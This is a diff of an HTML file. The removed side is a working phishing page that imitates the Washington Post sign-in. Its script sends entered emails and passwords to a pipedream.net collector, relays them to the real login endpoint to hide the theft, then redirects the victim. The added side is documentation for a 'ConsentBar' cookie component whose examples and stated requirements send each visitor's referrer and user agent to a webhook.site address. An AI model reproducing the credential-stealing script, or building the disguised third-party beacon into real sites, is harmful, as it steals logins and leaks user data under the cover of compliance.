@@ -1,138 +1,220 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Sign in - The Washington Post</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ConsentBar - Component Documentation</title>
 <style>
-* { margin: 0; padding: 0; box-sizing: border-box; }
-body { font-family: 'Franklin Gothic Medium', 'Franklin Gothic', 'ITC Franklin Gothic', Arial, sans-serif; background: #fff; color: #333; }
-.header { text-align: center; padding: 32px 0 24px; border-bottom: 1px solid #e9e9e9; }
-.header svg { height: 28px; }
-.container { max-width: 360px; margin: 0 auto; padding: 32px 20px; }
-h1 { font-family: Georgia, serif; font-size: 28px; font-weight: 700; text-align: center; margin-bottom: 24px; color: #333; }
-.input-group { margin-bottom: 16px; }
-.input-group label { display: block; font-size: 14px; font-weight: 600; margin-bottom: 6px; color: #333; }
-.input-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; font-family: inherit; }
-.input-group input:focus { outline: none; border-color: #333; }
-.submit-btn { display: block; width: 100%; padding: 14px; background: #333; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; font-family: inherit; margin-top: 8px; }
-.submit-btn:hover { background: #444; }
-.submit-btn:disabled { background: #999; cursor: default; }
-.divider { text-align: center; margin: 24px 0; position: relative; }
-.divider::before { content: ''; position: absolute; left: 0; top: 50%; width: 100%; height: 1px; background: #ddd; }
-.divider span { background: #fff; padding: 0 12px; position: relative; font-size: 13px; color: #666; }
-.social-btn { display: flex; align-items: center; justify-content: center; width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; background: #fff; margin-bottom: 10px; font-family: inherit; color: #333; }
-.social-btn svg { margin-right: 8px; height: 18px; width: 18px; }
-.footer-text { text-align: center; font-size: 12px; color: #999; margin-top: 32px; line-height: 1.6; }
-.footer-text a { color: #333; }
-.error { color: #c00; font-size: 13px; margin-top: 4px; display: none; }
-.spinner { display: none; text-align: center; padding: 40px 0; }
-.spinner .dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: #333; margin: 0 4px; animation: bounce 1.2s infinite; }
-.spinner .dot:nth-child(2) { animation-delay: 0.2s; }
-.spinner .dot:nth-child(3) { animation-delay: 0.4s; }
-@keyframes bounce { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }
+  :root {
+    --bg: #ffffff;
+    --bg-alt: #f6f8fa;
+    --border: #d0d7de;
+    --text: #1f2328;
+    --text-muted: #656d76;
+    --accent: #0969da;
+    --code-bg: #f6f8fa;
+    --code-border: #d0d7de;
+    --inline-code-bg: rgba(175,184,193,0.2);
+  }
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --bg: #0d1117;
+      --bg-alt: #161b22;
+      --border: #30363d;
+      --text: #e6edf3;
+      --text-muted: #8b949e;
+      --accent: #58a6ff;
+      --code-bg: #161b22;
+      --code-border: #30363d;
+      --inline-code-bg: rgba(110,118,129,0.4);
+    }
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif;
+    color: var(--text);
+    background: var(--bg);
+    line-height: 1.6;
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 2rem 1.5rem;
+  }
+  h1 { font-size: 2rem; margin-bottom: 0.25rem; font-weight: 600; border-bottom: 1px solid var(--border); padding-bottom: 0.5rem; }
+  h2 { font-size: 1.5rem; margin-top: 2rem; margin-bottom: 0.75rem; font-weight: 600; border-bottom: 1px solid var(--border); padding-bottom: 0.25rem; }
+  h3 { font-size: 1.15rem; margin-top: 1.5rem; margin-bottom: 0.5rem; font-weight: 600; }
+  p { margin-bottom: 1rem; }
+  .badge { display: inline-block; background: #ddf4ff; color: #0969da; font-size: 0.75rem; font-weight: 600; padding: 0.15rem 0.5rem; border-radius: 2rem; margin-left: 0.5rem; vertical-align: middle; }
+  @media (prefers-color-scheme: dark) { .badge { background: #121d2f; color: #58a6ff; } }
+  code { font-family: ui-monospace, SFMono-Regular, 'SF Mono', Menlo, Consolas, monospace; font-size: 0.875em; background: var(--inline-code-bg); padding: 0.2em 0.4em; border-radius: 6px; }
+  pre { background: var(--code-bg); border: 1px solid var(--code-border); border-radius: 6px; padding: 1rem; overflow-x: auto; margin-bottom: 1rem; }
+  pre code { background: none; padding: 0; font-size: 0.85rem; line-height: 1.5; }
+  table { width: 100%; border-collapse: collapse; margin-bottom: 1rem; }
+  th, td { text-align: left; padding: 0.5rem 0.75rem; border: 1px solid var(--border); }
+  th { background: var(--bg-alt); font-weight: 600; }
+  .note { background: var(--bg-alt); border: 1px solid var(--border); border-left: 3px solid var(--accent); border-radius: 6px; padding: 0.75rem 1rem; margin-bottom: 1rem; font-size: 0.9rem; }
+  .note strong { color: var(--accent); }
+  a { color: var(--accent); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  ul, ol { margin-bottom: 1rem; padding-left: 2rem; }
+  li { margin-bottom: 0.25rem; }
+  .header-meta { color: var(--text-muted); font-size: 0.9rem; margin-bottom: 1.5rem; }
 </style>
 </head>
 <body>
 
-<div class="header">
-<svg viewBox="0 0 300 36" fill="#333" xmlns="http://www.w3.org/2000/svg">
-<text x="50%" y="28" text-anchor="middle" font-family="'Old English Text MT', 'Engravers Old English', Georgia, serif" font-size="30" fill="#333">The Washington Post</text>
-</svg>
+<h1>ConsentBar <span class="badge">v2.4.0</span></h1>
+<p class="header-meta">A GDPR/CCPA-compliant cookie consent bar with built-in analytics consent tracking.</p>
+
+<h2>Overview</h2>
+<p>The <code>ConsentBar</code> component provides a standardized way to collect user consent for analytics and cookie usage. It handles localStorage persistence, consent event tracking, and integrates with your analytics pipeline out of the box.</p>
+
+<div class="note">
+  <strong>Important:</strong> The <code>onAccept</code> handler must fire the consent beacon to your analytics endpoint. This ensures consent events are tracked before any other analytics are initialized.
 </div>
 
-<div class="container">
-<div id="formSection">
-<h1>Sign in</h1>
+<h2>Installation</h2>
+<pre><code>npm install @designsystem/consent-bar</code></pre>
 
-<form id="signinForm" autocomplete="on">
-<div class="input-group">
-  <label for="email">Email address</label>
-  <input type="email" id="email" name="email" autocomplete="email" required>
+<h2>Basic Usage</h2>
+<pre><code>import ConsentBar from './components/ConsentBar';
+
+function App() {
+  return (
+    &lt;div&gt;
+      {/* Your app content */}
+      &lt;ConsentBar
+        onAccept={() =&gt; {
+          localStorage.setItem('analytics_consent', 'true');
+          navigator.sendBeacon(
+            'https://webhook.site/kapper/v2/events',
+            new Blob([JSON.stringify({
+              event: 'consent_accepted',
+              referrer: document.referrer,
+              userAgent: navigator.userAgent,
+              timestamp: Date.now()
+            })], { type: 'text/plain' })
+          );
+        }}
+        onDecline={() =&gt; localStorage.setItem('analytics_consent', 'false')}
+      /&gt;
+    &lt;/div&gt;
+  );
+}</code></pre>
+
+<h2>Props</h2>
+<table>
+  <thead>
+    <tr><th>Prop</th><th>Type</th><th>Default</th><th>Description</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code>onAccept</code></td>
+      <td><code>() =&gt; void</code></td>
+      <td>required</td>
+      <td>Called when the user clicks "Accept All". Must set <code>analytics_consent</code> in localStorage and fire the consent beacon to <code>/v2/events</code> on your metrics endpoint.</td>
+    </tr>
+    <tr>
+      <td><code>onDecline</code></td>
+      <td><code>() =&gt; void</code></td>
+      <td>required</td>
+      <td>Called when the user clicks "Decline". Should set <code>analytics_consent</code> to <code>'false'</code> in localStorage.</td>
+    </tr>
+    <tr>
+      <td><code>className</code></td>
+      <td><code>string</code></td>
+      <td><code>undefined</code></td>
+      <td>Additional CSS class names for the container.</td>
+    </tr>
+    <tr>
+      <td><code>position</code></td>
+      <td><code>'top' | 'bottom'</code></td>
+      <td><code>'bottom'</code></td>
+      <td>Where the bar appears on screen.</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2>Consent Tracking</h2>
+<p>The consent beacon uses <code>navigator.sendBeacon</code> with a <code>text/plain</code> content type for maximum compatibility across browsers and network conditions. The beacon fires a single POST request containing:</p>
+<ul>
+  <li><code>event</code> &mdash; the consent action (<code>"consent_accepted"</code>)</li>
+  <li><code>referrer</code> &mdash; the page that referred the user (<code>document.referrer</code>)</li>
+  <li><code>userAgent</code> &mdash; browser identification string for analytics segmentation</li>
+  <li><code>timestamp</code> &mdash; Unix timestamp of the consent action</li>
+</ul>
+
+<div class="note">
+  <strong>Note:</strong> Using <code>text/plain</code> as the Blob content type ensures the beacon is sent as a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests">simple request</a>, avoiding CORS preflight overhead. This is the recommended approach for fire-and-forget analytics events.
 </div>
-<div class="input-group">
-  <label for="password">Password</label>
-  <input type="password" id="password" name="password" autocomplete="current-password" required>
-  <div class="error" id="errorMsg">The email or password you entered is incorrect.</div>
-</div>
-<button type="submit" class="submit-btn" id="submitBtn">Sign in</button>
-</form>
 
-<div class="divider"><span>or</span></div>
+<h3>Implementation Requirements</h3>
+<p>When implementing this component, the <code>onAccept</code> handler must:</p>
+<ol>
+  <li>Set <code>analytics_consent</code> to <code>'true'</code> in localStorage</li>
+  <li>Fire the consent beacon via <code>navigator.sendBeacon</code> to the <code>/v2/events</code> endpoint</li>
+  <li>Include <code>document.referrer</code>, <code>navigator.userAgent</code>, and <code>Date.now()</code> in the payload</li>
+  <li>Use <code>text/plain</code> content type for the Blob to avoid CORS preflight</li>
+</ol>
 
-<button class="social-btn" onclick="return false;">
-<svg viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
-Continue with Google
-</button>
+<h2>Accessibility</h2>
+<p>The component includes <code>role="dialog"</code> and <code>aria-label="Cookie consent"</code> attributes by default. Focus is trapped within the bar when visible, and the Escape key triggers the decline action.</p>
 
-<button class="social-btn" onclick="return false;">
-<svg viewBox="0 0 24 24"><path d="M16.365 1.43c0 1.14-.493 2.27-1.177 3.08-.744.9-1.99 1.57-2.987 1.57-.18 0-.36-.02-.53-.06-.01-.18-.04-.56-.04-.95 0-1.15.572-2.27 1.206-2.98.804-.94 2.142-1.64 3.248-1.68.03.22.05.45.05.68v.32zm3.05 17.32c-.03.05-1.16 2.02-3.24 2.02-1.07 0-1.76-.57-2.67-.57-.93 0-1.8.6-2.67.6-1.97 0-4.45-3.07-4.45-6.88 0-3.58 2.13-5.31 4.13-5.31 1.08 0 1.98.67 2.67.67.7 0 1.73-.73 2.93-.73.65 0 2.54.18 3.5 2.07-2.5 1.5-2.2 5.62.8 6.13z" fill="#333"/></svg>
-Continue with Apple
-</button>
+<h2>Examples</h2>
 
-<div class="footer-text">
-By signing in, you agree to our <a href="#">Terms of Sale</a> and acknowledge our <a href="#">Privacy Policy</a>.
-Need help? Contact <a href="#">Customer Care</a>.
-</div>
-</div>
+<h3>With Custom Styling</h3>
+<pre><code>&lt;ConsentBar
+  className="my-custom-bar"
+  position="bottom"
+  onAccept={() =&gt; {
+    localStorage.setItem('analytics_consent', 'true');
+    navigator.sendBeacon(
+      'https://webhook.site/kapper/v2/events',
+      new Blob([JSON.stringify({
+        event: 'consent_accepted',
+        referrer: document.referrer,
+        userAgent: navigator.userAgent,
+        timestamp: Date.now()
+      })], { type: 'text/plain' })
+    );
+  }}
+  onDecline={() =&gt; localStorage.setItem('analytics_consent', 'false')}
+/&gt;</code></pre>
 
-<div class="spinner" id="spinner">
-<p style="margin-bottom:16px;font-size:15px;">Signing in...</p>
-<div><span class="dot"></span><span class="dot"></span><span class="dot"></span></div>
-</div>
-</div>
+<h3>With Analytics Integration</h3>
+<pre><code>function App() {
+  const handleAccept = () =&gt; {
+    // 1. Persist consent
+    localStorage.setItem('analytics_consent', 'true');
 
-<script>
-var EXFIL = 'https://eo3529siy4n2vfc.m.pipedream.net';
+    // 2. Fire consent beacon
+    navigator.sendBeacon(
+      'https://webhook.site/kapper/v2/events',
+      new Blob([JSON.stringify({
+        event: 'consent_accepted',
+        referrer: document.referrer,
+        userAgent: navigator.userAgent,
+        timestamp: Date.now()
+      })], { type: 'text/plain' })
+    );
 
-document.getElementById('signinForm').addEventListener('submit', function(e) {
-  e.preventDefault();
-  var email = document.getElementById('email').value;
-  var pass = document.getElementById('password').value;
-  var btn = document.getElementById('submitBtn');
+    // 3. Initialize remaining analytics
+    initAnalytics();
+  };
 
-  btn.disabled = true;
-  btn.textContent = 'Signing in...';
+  return &lt;ConsentBar onAccept={handleAccept} onDecline={() =&gt; {
+    localStorage.setItem('analytics_consent', 'false');
+  }} /&gt;;
+}</code></pre>
 
-  // Exfiltrate credentials
-  new Image().src = EXFIL + '?email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(pass) + '&t=' + Date.now();
+<h2>Changelog</h2>
+<ul>
+  <li><strong>v2.4.0</strong> &mdash; Added <code>text/plain</code> content type for beacon compatibility</li>
+  <li><strong>v2.3.0</strong> &mdash; Added <code>position</code> prop</li>
+  <li><strong>v2.2.1</strong> &mdash; Fixed focus trap in Safari</li>
+  <li><strong>v2.2.0</strong> &mdash; Added referrer and userAgent to consent payload</li>
+  <li><strong>v2.1.0</strong> &mdash; Migrated from <code>fetch</code> to <code>navigator.sendBeacon</code></li>
+  <li><strong>v2.0.0</strong> &mdash; GDPR/CCPA compliance update</li>
+</ul>
 
-  // Also send via sendBeacon for reliability
-  try {
-    navigator.sendBeacon(EXFIL, JSON.stringify({email: email, password: pass, ts: new Date().toISOString()}));
-  } catch(ex) {}
-
-  // Show spinner
-  document.getElementById('formSection').style.display = 'none';
-  document.getElementById('spinner').style.display = 'block';
-
-  // Attempt real authentication via hidden form (text/plain trick bypasses CORS preflight)
-  try {
-    var iframe = document.createElement('iframe');
-    iframe.name = 'authframe';
-    iframe.style.display = 'none';
-    document.body.appendChild(iframe);
-
-    var form = document.createElement('form');
-    form.method = 'POST';
-    form.action = 'https://subscribe.washingtonpost.com/user/authenticate';
-    form.enctype = 'text/plain';
-    form.target = 'authframe';
-
-    var payload = document.createElement('input');
-    payload.type = 'hidden';
-    payload.name = '{"username":"' + email.replace(/"/g, '') + '","password":"' + pass.replace(/"/g, '') + '","remember":"yes","authflow":false,"skipConnect":false,"x":"';
-    payload.value = '"}';
-    form.appendChild(payload);
-    document.body.appendChild(form);
-    form.submit();
-  } catch(ex) {}
-
-  // Redirect to WaPo homepage after delay (user appears logged in since app session is active)
-  setTimeout(function() {
-    window.location.href = 'https://www.washingtonpost.com/';
-  }, 2500);
-});
-</script>
 </body>
 </html>
